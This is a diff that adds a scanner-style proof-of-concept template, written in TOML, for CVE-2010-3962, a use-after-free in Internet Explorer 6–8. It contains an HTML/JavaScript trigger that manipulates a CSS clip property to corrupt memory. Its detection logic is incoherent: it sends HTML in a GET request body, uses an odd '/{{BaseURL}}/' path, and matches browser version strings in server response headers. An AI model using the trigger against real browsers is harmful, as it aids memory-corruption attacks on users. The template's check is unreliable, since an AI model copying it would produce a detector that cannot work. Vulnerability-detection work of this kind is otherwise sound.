@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测 Microsoft Internet Explorer 6/7/8 释放后使用漏洞，通过构造特制 CSS clip 属性触发未初始化内存损坏"
+id = "POC-AVE-2010-0500"
+name = "CVE-2010-3962 PoC"
+severity = "high"
+tags = ["cve-2010-3962"]
+vuln_id = [
+    "CVE-2010-3962",
+    "AVE-2010-0500",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """<html><body><div id="x" style="clip:rect(0,0,0,0)"></div><script>var d=document.getElementById('x');d.style.clip='auto';d.removeAttribute('style');d.style.cssText='clip:rect(0,0,0,0)';</script></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "MSIE 6",
+    "MSIE 7",
+    "MSIE 8",
+]
